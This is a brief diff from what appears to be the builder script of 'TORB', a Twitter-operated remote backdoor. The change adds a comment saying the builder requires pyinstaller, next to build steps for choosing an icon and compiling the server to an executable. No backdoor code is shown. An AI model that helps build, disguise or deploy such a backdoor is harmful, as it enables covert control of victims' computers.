@@ -26,6 +26,8 @@
 # 2) Select an icon for your server's executable
 # 3) Compile server to executable
 
+# Server Builder requires pyinstaller
+
 print "\nTORB - Twitter Operated Remote Backdoor (Public Edition)\nCoded by Pythogen 2018\n"
 
 print """
